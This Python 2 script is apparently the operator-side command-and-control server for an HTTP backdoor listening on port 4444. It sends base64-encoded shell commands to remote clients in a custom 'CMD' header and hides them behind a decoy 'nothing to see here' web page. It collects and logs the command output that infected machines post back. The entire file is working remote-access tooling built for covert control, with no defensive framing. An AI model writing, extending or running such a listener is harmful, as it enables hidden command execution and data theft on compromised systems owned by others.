from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
import base64
from termcolor import colored
import urllib
PORT_NUMBER = 4444
 
class myHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        CMD = base64.b64encode(raw_input(" CMD: >> "))
        self.send_header('CMD',CMD)
        self.end_headers()
        self.wfile.write("<html><body>nothing to see here</body></html>")
        return
    def do_POST(self):
        f = open('text.txt', 'w')
        self.send_response(200)
        content_len = int(self.headers.getheader('content-length', 0))
        test_data = self.rfile.read(content_len)
        result = test_data[7:]
        result = urllib.unquote(result).decode('utf8')
        try:
            result = base64.b64decode(result)
        except:
            print "no base 64 result:"+result
        #print(colored(result, 'red'))
        result=result.split('_n1w_')
        for string in result:
                f.write(string+ '\n')
                print(colored(string, 'green'))
        f.write('---comand end---\n')
        f.close()
        CMD = base64.b64encode(raw_input(" CMD: >> "))
        self.send_header('CMD',CMD)
        self.end_headers()
        self.wfile.write("<html><body>nothing to see here</body></html>")
        return
      

try:
    server = HTTPServer(('', PORT_NUMBER), myHandler)
    server.serve_forever()
 
except KeyboardInterrupt:
    print '^C received, shutting down the web server'
    server.socket.close()
